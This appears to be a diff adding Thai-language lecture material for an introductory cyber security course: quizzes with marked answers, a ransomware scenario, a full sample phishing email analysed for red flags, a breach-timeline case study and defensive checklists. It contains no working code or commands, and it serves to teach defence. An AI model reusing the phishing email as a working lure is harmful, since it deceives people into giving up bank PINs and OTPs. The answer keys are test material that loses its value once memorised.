+- Virus: ต้องแนบกับ host file และต้องรอให้ user รันโปรแกรม
+- Worm: ทำงานได้เองและแพร่กระจายอัตโนมัติผ่านเครือข่าย
+```
+
+#### ข้อ 2: Ransomware
+```
+WannaCry ใช้ช่องโหว่ใดในการแพร่กระจาย?
+
+A) SQL Injection
+B) Cross-Site Scripting (XSS)
+C) EternalBlue (MS17-010)  ✓
+D) Buffer Overflow
+
+คำอธิบาย:
+EternalBlue เป็นช่องโหว่ใน SMBv1 protocol ที่ NSA พัฒนา
+แต่รั่วไหลออกมาและถูกนำมาใช้ใน WannaCry
+```
+
+#### ข้อ 3: Social Engineering
+```
+เทคนิค Social Engineering ใดที่ใช้สร้างความเร่งด่วน?
+
+A) Baiting
+B) Pretexting
+C) Urgency (Time Pressure)  ✓
+D) Tailgating
+
+คำอธิบาย:
+Urgency คือการสร้างความกดดันด้านเวลา เช่น
+"ต้องทำภายใน 24 ชั่วโมงมิฉะนั้น account จะถูกระงับ"
+ทำให้เหยื่อตัดสินใจโดยไม่คิดอย่างรอบคอบ
+```
+
+#### ข้อ 4: APT
+```
+APT (Advanced Persistent Threat) มีลักษณะใดต่อไปนี้?
+
+A) โจมตีแบบเร็วและส่งเสียงดัง
+B) ใช้ tools สำเร็จรูปทั่วไป
+C) อยู่ในระบบเป้าหมายเป็นเวลานาน  ✓
+D) มุ่งเป้าโจมตีแบบสุ่ม
+
+คำอธิบาย:
+APT มีลักษณะเฉพาะคือ:
+- Targeted (เป้าหมายเฉพาะเจาะจง)
+- Persistent (คงอยู่ระยะยาว)
+- Advanced (ใช้เทคนิคที่ซับซ้อน)
+- Stealthy (หลบหลีกการตรวจจับ)
+```
+
+#### ข้อ 5: Phishing vs Spear Phishing
+```
+Spear Phishing ต่างจาก Phishing ทั่วไปอย่างไร?
+
+A) ใช้ email แทน SMS
+B) เน้นโจมตีเป้าหมายเฉพาะบุคคล  ✓
+C) มีอัตราความสำเร็จต่ำกว่า
+D) ไม่มีความแตกต่างกัน
+
+คำอธิบาย:
+Spear Phishing = Targeted phishing
+- ใช้ข้อมูลส่วนตัวของเหยื่อ
+- ปรับแต่งเนื้อหาให้เหมาะกับเป้าหมาย
+- มีอัตราความสำเร็จสูงกว่า phishing ทั่วไป
+```
+
+---
+
+### แบบฝึกหัดวิเคราะห์สถานการณ์
+
+#### **Exercise 1: Malware Identification**
+
+**สถานการณ์:**
+```
+บริษัท XYZ พบว่าไฟล์ในเครื่องคอมพิวเตอร์หลายเครื่องถูกเข้ารหัส
+หน้าจอแสดงข้อความเรียกค่าไถ่ 0.5 Bitcoin
+เครื่องเหล่านี้เชื่อมต่อกันผ่าน LAN
+ไม่มีการกระทำของผู้ใช้ก่อนเกิดเหตุ
+การแพร่กระจายเกิดขึ้นภายใน 30 นาที
+```
+
+**คำถาม:**
+1. Malware นี้เป็นประเภทใด? (ตอบได้มากกว่า 1 ประเภท)
+2. จงอธิบายกลไกการแพร่กระจาย
+3. ควรมีมาตรการป้องกันอย่างไร? (3 ข้อ)
+
+**คำตอบตัวอย่าง:**
+```
+1. ประเภทของ Malware:
+   • Ransomware (เข้ารหัสไฟล์และเรียกค่าไถ่)
+   • Worm (แพร่กระจายอัตโนมัติผ่าน network)
+
+2. กลไกการแพร่กระจาย:
+   • Exploit network vulnerability (เช่น SMB)
+   • สแกนหาเครื่องที่มีช่องโหว่ใน LAN
+   • ทำ lateral movement ไปเครื่องอื่น
+   • เข้ารหัสไฟล์และแสดง ransom note
+
+3. มาตรการป้องกัน:
+   a) Technical Controls:
+      • Patch management - อัปเดต OS และ software
+      • Network segmentation - แบ่ง network ออกเป็นส่วน
+      • Disable SMBv1 protocol
+      • Deploy EDR/Antivirus solution
+
+   b) Administrative Controls:
+      • Regular backup (offline/offsite)
+      • Backup testing procedures
+      • Incident response plan
+
+   c) Awareness:
+      • Security awareness training
+      • Email phishing simulation
+      • Report suspicious activity
+```
+
+---
+
+#### **Exercise 2: Phishing Analysis**
+
+**สถานการณ์: วิเคราะห์ Email ต่อไปนี้**
+
+```
+From: support@bankk-secure.com
+To: customer@company.com
+Subject: 🔴 ALERT: Unauthorized transaction detected!
+
+Dear Valued Customer,
+
+Our security system detected suspicious transaction 
+from your account:
+
+Transaction Details:
+• Amount: 50,000 THB
+• Merchant: Unknown Online Store
+• Location: Nigeria
+• Time: 2 minutes ago
+
+Your account has been TEMPORARILY SUSPENDED for 
+your protection.
+
+To reactivate your account immediately:
+1. Click verification link: http://bit.ly/bank-verify-2024
+2. Enter your account number and PIN
+3. Confirm your identity with OTP
+
+⚠️ You must complete verification within 1 hour
+or your account will be permanently closed and
+funds will be transferred to escrow account.
+
+If you have questions, DO NOT call the number on
+your card. Reply to this email directly.
+
+Best Regards,
+Security Department
+Bank Thailand
+```
+
+**คำถาม:**
+1. ระบุ red flags ทั้งหมดที่พบ (อย่างน้อย 8 ข้อ)
+2. Email นี้พยายามโจมตีแบบใด?
+3. ถ้าคุณเป็นเหยื่อ ควรทำอย่างไร?
+4. องค์กรควรมีมาตรการป้องกันอย่างไร?
+
+**คำตอบตัวอย่าง:**
+```
+1. Red Flags:
+   ✗ Domain typosquatting: bankk-secure.com (k เพิ่ม)
+   ✗ Urgency: "1 hour" deadline
+   ✗ Threat: "permanently closed"
+   ✗ URL shortener: bit.ly (ซ่อน real URL)
+   ✗ Request PIN: ธนาคารจริงไม่ขอ PIN ทาง email
+   ✗ Generic greeting: "Dear Valued Customer"
+   ✗ Suspicious timing: "2 minutes ago"
+   ✗ Poor grammar: "Bank Thailand" (not official name)
+   ✗ Don't call card number: unusual instruction
+   ✗ Excessive use of emoji and capitals
+
+2. ประเภทการโจมตี:
+   • Phishing (หลอกให้คลิก link และกรอกข้อมูล)
+   • Credential Harvesting (ขโมย account + PIN)
+   • Social Engineering (ใช้ fear และ urgency)
+
+3. ถ้าเป็นเหยื่อควร:
+   ❌ ไม่ควรทำ:
+      • คลิกลิงก์
+      • ตอบกลับ email
+      • กรอกข้อมูลส่วนตัว
+
+   ✅ ควรทำ:
+      • ลบ email ทิ้ง
+      • ติดต่อธนาคารผ่านช่องทางอย่างเป็นทางการ
+        (หมายเลขหลังบัตร, mobile app, website)
+      • ตรวจสอบ account ผ่านช่องทางปลอดภัย
+      • แจ้งธนาคารเกี่ยวกับ phishing attempt
+
+4. มาตรการขององค์กร:
+   Technical:
+   • Email filtering (SPF, DKIM, DMARC)
+   • Anti-phishing tools
+   • URL filtering/sandboxing
+
+   Administrative:
+   • Security awareness training
+   • Phishing simulation exercises
+   • Clear reporting procedures
+
+   Policy:
+   • Never request sensitive info via email
+   • Multi-factor authentication (MFA)
+   • Incident response procedures
+```
+
+---
+
+### Group Case Study: วิเคราะห์เหตุการณ์โจมตี
+
+#### **Scenario: E-Commerce Data Breach**
+
+**Background:**
+```
+บริษัท: TechShop.co.th (E-commerce 100 employees)
+Industry: Online Electronics Retailer
+Database: 500,000 customer records
+Annual Revenue: 200 million THB
+```
+
+**Timeline of Attack:**
+```
+Day 0 (Jan 1):
+└─> Attacker sends spear-phishing email to IT manager
+    Subject: "Server Performance Report Q4"
+    Attachment: performance_report.pdf.exe
+
+Day 1 (Jan 2):
+└─> IT manager opens attachment
+    → Trojan installed
+    → Backdoor established
+
+Day 5 (Jan 6):
+└─> Attacker performs reconnaissance
+    → Maps network structure
+    → Identifies database servers
+    → Discovers unpatched SQL Server
+
+Day 10 (Jan 11):
+└─> Lateral movement to database server
+    → Exploits SQL injection vulnerability
+    → Gains access to customer database
+
+Day 15-30:
+└─> Data exfiltration
+    → 500,000 customer records stolen
+    • Names, addresses, emails
+    • Phone numbers
+    • Credit card numbers (partial)
+    • Order history
+
+Day 31 (Feb 1):
+└─> Detection
+    → Unusual network traffic detected
+    → Forensics team called in
+    → Breach discovered
+
+Day 32 (Feb 2):
+└─> Public disclosure
+    → PDPA notification to customers
+    → Media coverage
+    → Stock price drops 20%
+```
+
+**คำถามสำหรับ Group Discussion:**
+
+**Part 1: Threat Analysis (15 นาที)**
+```
+1. ระบุประเภทของ threat ทั้งหมดที่เกิดขึ้น
+2. การโจมตีนี้เป็น APT หรือไม่? เพราะอะไร?
+3. Attack vector หลักคืออะไร?
+4. Attacker มีเป้าหมายอะไร? (Confidentiality/Integrity/Availability)
+```
+
+**Part 2: Vulnerability Analysis (15 นาที)**
+```
+5. ระบุช่องโหว่ทั้งหมดที่ attacker ใช้ประโยชน์
+   - Technical vulnerabilities
+   - Human vulnerabilities
+   - Process vulnerabilities
+
+6. ช่องโหว่ไหนสำคัญที่สุด? เพราะอะไร?
+```
+
+**Part 3: Impact Assessment (10 นาที)**
+```
+7. ประเมินผลกระทบ (Impact):
+   - Financial loss
+   - Reputation damage
+   - Legal consequences
+   - Customer trust
+
+8. คำนวณประมาณการความเสียหาย (rough estimate)
+```
+
+**Part 4: Prevention & Response (20 นาที)**
+```
+9. จะป้องกันการโจมตีนี้ได้อย่างไร? (อย่างน้อย 10 มาตรการ)
+   แบ่งตาม:
+   - Prevention (ป้องกันก่อนเกิด)
+   - Detection (ตรวจจับขณะเกิด)
+   - Response (ตอบสนองหลังเกิด)
+
+10. สร้าง Incident Response Timeline
+    แสดงขั้นตอนที่ควรทำตั้งแต่ Day 31 เป็นต้นไป
+```
+
+**ตัวอย่างคำตอบ (สำหรับอาจารย์):**
+
+<details>
+<summary>คลิกเพื่อดูคำตอบตัวอย่าง</summary>
+
+```
+1. ประเภทของ Threats:
+   • Social Engineering (Spear Phishing)
+   • Malware (Trojan with Backdoor)
+   • Network Intrusion
+   • SQL Injection
+   • Data Exfiltration
+
+2. เป็น APT หรือไม่?
+   มีลักษณะของ APT บางส่วน:
+   ✓ Targeted (เลือกเป้าหมายเฉพาะ)
+   ✓ Persistent (อยู่ในระบบ 30 วัน)
+   ✓ Multi-stage attack
+   ✗ ไม่ซับซ้อนมาก (ใช้ช่องโหว่ที่รู้จักกันดี)
+   
+   สรุป: เป็น Targeted Attack แต่ไม่ถึงระดับ APT
+
+3. Attack Vector:
+   Primary: Spear Phishing Email
+   Secondary: Unpatched SQL Server
+
+4. เป้าหมาย:
+   Confidentiality Breach (ขโมยข้อมูลลูกค้า)
+
+5. Vulnerabilities:
+   Technical:
+   • No email filtering/sandboxing
+   • Unpatched SQL Server
+   • Weak network segmentation
+   • No IDS/IPS
+   • Insufficient logging
+
+   Human:
+   • IT manager opened suspicious attachment
+   • No security awareness training
+   • Lack of incident reporting culture
+
+   Process:
+   • No patch management policy
+   • No regular security audits
+   • No network monitoring
+   • Weak access control
+
+6. ช่องโหว่สำคัญที่สุด:
+   Spear Phishing + Human Factor
+   เพราะ: เป็นจุดเริ่มต้นของการโจมตี
+   ถ้าป้องกันตรงนี้ได้ จะไม่เกิดเหตุการณ์ทั้งหมด
+
+7. Impact Assessment:
+   Financial:
+   • PDPA fines: up to 5 million THB
+   • Incident response cost: 2-3 million THB
+   • Credit monitoring for customers: 5 million THB
+   • Revenue loss from reputation: 20-30 million THB
+   • Legal fees: 1-2 million THB
+   
+   Total: ~35-45 million THB
+
+   Reputation:
+   • Customer trust decreased
+   • Negative media coverage
+   • Competitor advantage
+
+   Legal:
+   • PDPA violations
+   • Class action lawsuits
+   • Regulatory investigations
+
+8. Prevention Measures:
+
+   PREVENTION (ป้องกัน):
+   1. Email Security:
+      • Anti-phishing tools
+      • Attachment sandboxing
+      • SPF/DKIM/DMARC
+   
+   2. Endpoint Protection:
+      • EDR solution
+      • Application whitelisting
+      • Host-based firewall
+   
+   3. Network Security:
+      • Network segmentation
+      • Firewall rules
+      • IDS/IPS deployment
+   
+   4. Access Control:
+      • Principle of least privilege
+      • Multi-factor authentication
+      • Regular access reviews
+   
+   5. Patch Management:
+      • Regular patching schedule
+      • Vulnerability scanning
+      • Asset inventory
+   
+   6. Security Awareness:
+      • Phishing simulation
+      • Security training
+      • Incident reporting procedures
+
+   DETECTION (ตรวจจับ):
+   7. Monitoring:
+      • SIEM implementation
+      • Log aggregation
+      • Alert rules
+   
+   8. Anomaly Detection:
+      • Unusual network traffic
+      • Data exfiltration patterns
+      • User behavior analytics
+
+   RESPONSE (ตอบสนอง):
+   9. Incident Response:
+      • IR team and procedures
+      • Communication plan
+      • Forensics capability
+   
+   10. Business Continuity:
+       • Backup and recovery
+       • Disaster recovery plan
+       • Crisis management
+
+9. Incident Response Timeline (จาก Day 31):
+
+   Day 31:
+   [00:00] Detection: Unusual traffic detected
+   [01:00] Initial triage
+   [02:00] Escalate to IR team
+   [04:00] Containment: Isolate affected systems
+   [06:00] Analysis: Determine scope
+
+   Day 31-32:
+   [Day 31 12:00] Executive notification
+   [Day 32 00:00] Legal team engaged
+   [Day 32 08:00] Forensics investigation begins
+
+   Day 32:
+   [10:00] Public notification prepared
+   [12:00] PDPA notification (within 72 hours)
+   [14:00] Press release
+   [16:00] Customer communication
+
+   Day 33-35:
+   [Day 33] Eradication: Remove malware, close backdoors
+   [Day 34] Recovery: Restore from clean backups
+   [Day 35] Monitoring: Enhanced surveillance
+
+   Day 36+:
+   [Week 2] Post-incident review
+   [Week 3] Implement improvements
+   [Week 4] Security audit
+```
+</details>
+
+---
+
+## 🎯 <a name="summary"></a>สรุปและแนวทางป้องกัน
+
+### สรุปบทเรียน
+
+```
+╔════════════════════════════════════════════════════════╗
+║          WEEK 2 SUMMARY: CYBER THREATS & MALWARE       ║
+╠════════════════════════════════════════════════════════╣
+║                                                        ║
+║  1. THREAT CLASSIFICATION                              ║
+║     • Malware (Virus, Worm, Trojan, Ransomware)        ║
+║     • Social Engineering (Phishing, Pretexting)        ║
+║     • Advanced Persistent Threats (APT)                ║
+║                                                        ║
+║  2. MALWARE CHARACTERISTICS                            ║
+║     Virus     → Needs host file + user action          ║
+║     Worm      → Self-propagating via network           ║
+║     Trojan    → Disguised as legitimate software       ║
+║     Ransomware→ Encrypts files for ransom              ║
+║     Spyware   → Monitors user activities               ║
+║                                                        ║
+║  3. SOCIAL ENGINEERING                                 ║
+║     • Exploits human psychology                        ║
+║     • Uses urgency, authority, fear                    ║
+║     • Phishing is most common vector                   ║
+║                                                        ║
+║  4. APT CHARACTERISTICS                                ║
+║     • Targeted                                         ║
+║     • Persistent                                       ║
+║     • Advanced                                         ║
+║     • Stealthy                                         ║
+║                                                        ║
+╚════════════════════════════════════════════════════════╝
+```
+
+### Defense in Depth Strategy
+
+```
+┌──────────────────────────────────────────────┐
+│        DEFENSE IN DEPTH LAYERS               │
+├──────────────────────────────────────────────┤
+│                                              │
+│  Layer 7: Policies & Procedures              │
+│           └─> Security policies              │
+│           └─> User training                  │
+│           └─> Incident response              │
+│                                              │
+│  Layer 6: Data                               │
+│           └─> Encryption                     │
+│           └─> Data loss prevention (DLP)     │
+│           └─> Backup and recovery            │
+│                                              │
+│  Layer 5: Application                        │
+│           └─> Secure coding                  │
+│           └─> Input validation               │
+│           └─> Security testing               │
+│                                              │
+│  Layer 4: Host/Endpoint                      │
+│           └─> Antivirus/EDR                  │
+│           └─> Patch management               │
+│           └─> Host firewall                  │
+│                                              │
+│  Layer 3: Network                            │
+│           └─> Firewall                       │
+│           └─> IDS/IPS                        │
+│           └─> Segmentation                   │
+│                                              │
+│  Layer 2: Perimeter                          │
+│           └─> Email filtering                │
+│           └─> Web proxy                      │
+│           └─> VPN                            │
+│                                              │
+│  Layer 1: Physical                           │
+│           └─> Access control                 │
+│           └─> Surveillance                   │
+│           └─> Environmental controls         │
+│                                              │
+└──────────────────────────────────────────────┘
+```
+
+### Best Practices Checklist
+
+#### 🛡️ สำหรับ Software Engineers
+
+
+## Technical Controls
+
+### Email Security
+- [ ] Implement email filtering (SPF, DKIM, DMARC)
+- [ ] Deploy anti-phishing tools
+- [ ] Sandbox email attachments
+- [ ] Block executable attachments (.exe, .scr, .bat)
+
+### Endpoint Protection
+- [ ] Install and update antivirus/EDR
+- [ ] Enable host-based firewall
+- [ ] Implement application whitelisting
+- [ ] Use least privilege principles
+
+### Network Security
+- [ ] Segment networks (production, dev, DMZ)
+- [ ] Deploy IDS/IPS systems
+- [ ] Monitor network traffic
+- [ ] Restrict unnecessary services
+
+### Application Security
+- [ ] Input validation and sanitization
+- [ ] Parameterized queries (prevent SQLi)
+- [ ] Output encoding (prevent XSS)
+- [ ] Security headers (CSP, HSTS, etc.)
+- [ ] Regular security testing
+
+### Access Control
+- [ ] Multi-factor authentication (MFA)
+- [ ] Strong password policies
+- [ ] Regular access reviews
+- [ ] Privileged access management (PAM)
+
+### Patch Management
+- [ ] Regular vulnerability scanning
+- [ ] Timely patching (critical within 72 hours)
+- [ ] Patch testing procedures
+- [ ] Asset inventory management
+
+### Logging & Monitoring
+- [ ] Centralized log management (SIEM)
+- [ ] Real-time alerting
+- [ ] Log retention policy
+- [ ] Regular log review
+
+### Backup & Recovery
+- [ ] Regular backups (3-2-1 rule)
+- [ ] Offline/offsite backups
+- [ ] Backup testing
+- [ ] Disaster recovery plan
+
+## Administrative Controls
+
+### Security Awareness
+- [ ] Security awareness training (quarterly)
+- [ ] Phishing simulations
+- [ ] Incident reporting procedures
+- [ ] Clear security policies
+
+### Incident Response
+- [ ] Incident response plan
+- [ ] IR team with roles/responsibilities
+- [ ] Communication procedures
+- [ ] Post-incident reviews
+
+### Vendor Management
+- [ ] Vendor security assessments
+- [ ] Third-party risk management
+- [ ] Contract security requirements
+- [ ] Regular audits
+
+
+---
+
+### 💭 คำถามชวนคิดสำหรับอนาคต
+
+```
+1. "ในยุค AI/ML จะสามารถตรวจจับ malware ได้
+   ทุกชนิดหรือไม่? ทำไม?"
+
+2. "ถ้า ransomware จ่ายค่าไถ่แล้ว จะได้ไฟล์คืนจริง
+   ทุกครั้งหรือไม่? ทำไมไม่ควรจ่าย?"
+
+3. "APT group สามารถซ่อนตัวในระบบได้นานถึง
+   หลายปี เราจะรู้ได้อย่างไร?"
+
+4. "Social Engineering จะหายไปไหม ถ้าทุกคน
+   ได้รับการฝึกอบรมด้าน security awareness?"
+
+5. "Quantum Computing จะส่งผลต่อ ransomware
+   ในอนาคตอย่างไร?"
+```
+
+---
+
+### 📚 แหล่งข้อมูลเพิ่มเติม
+
+#### Recommended Reading
+```
+📖 Books:
+• "The Art of Deception" by Kevin Mitnick
+• "Countdown to Zero Day" by Kim Zetter (Stuxnet)
+• "Sandworm" by Andy Greenberg (NotPetya)
+
+🌐 Websites:
+• MITRE ATT&CK: attack.mitre.org
+• OWASP: owasp.org
+• US-CERT: us-cert.gov
+• Krebs on Security: krebsonsecurity.com
+
+📰 Threat Intelligence:
+• Mandiant Threat Reports
+• Symantec Threat Intelligence
+• Kaspersky Securelist
+
+🎓 Training:
+• SANS Cyber Aces
+• TryHackMe
+• HackTheBox
+```
+
+---
+
+### 📊 Quiz 1 Preparation
+
+**หัวข้อที่ต้องทบทวน:**
+```
+1. ความแตกต่างระหว่าง Virus, Worm, Trojan, Ransomware
+2. เทคนิค Social Engineering ต่างๆ
+3. Red flags ของ phishing email
+4. ลักษณะของ APT
+5. มาตรการป้องกันพื้นฐาน
+6. Case study: WannaCry
+```
+
+**รูปแบบข้อสอบ:**
+- Multiple choice: 60%
+- True/False: 20%
+- Short answer: 20%
+
+**เวลา:** 30 นาที
+**คะแนน:** 20 คะแนน
+
+---
+
+## 🎬 สรุปท้ายบทเรียน
+
+### Key Takeaways
+
+```
+✓ ภัยคุกคามมีหลายรูปแบบ เข้าใจลักษณะของแต่ละประเภท
+  สามารถช่วยป้องกันและตอบสนองได้อย่างเหมาะสม
+
+✓ Malware แต่ละประเภทมีพฤติกรรมแตกต่างกัน
+  ต้องใช้มาตรการป้องกันที่เหมาะสม
+
+✓ Human คือจุดอ่อนที่สำคัญที่สุด
+  Social Engineering มีประสิทธิภาพมากกว่าการโจมตีทางเทคนิค
+
+✓ APT เป็นภัยคุกคามระดับสูง
+  ต้องใช้มาตรการหลายชั้นในการป้องกัน
+
+✓ Defense in Depth คือกุญแจสำคัญ
+  ไม่พึ่งพามาตรการเดียว แต่ใช้หลายชั้น
+
+✓ Security Awareness เป็นเรื่องของทุกคน
+  ไม่ใช่แค่ IT หรือ Security team เท่านั้น
+```
+
+### Next Week Preview
+
+**Week 3: Vulnerabilities & Basic Risk Assessment**
+- Common Vulnerabilities and Exposures (CVE)
+- CVSS scoring
+- Risk assessment methodology
+- Hands-on: CVE database search
+
+---
+
+### 🙏 Thank You!
+
+```
+═══════════════════════════════════════════════
+  Questions? Discussion? Let's talk!
+═══════════════════════════════════════════════
+
+  💬 Class Discussion
+  📧 Email: thanit@rmutl.ac.th
+  💻 Course Materials: GitHub/LMS
+
+  Stay Curious! Stay Secure! 🔒
+═══════════════════════════════════════════════
+```
+
+---
+
+**End of Week 2 Materials**
+
+*Last Updated: January 2024*
+*ENGSE214 – Introduction to Cyber Security*
+*Software Engineering Program*
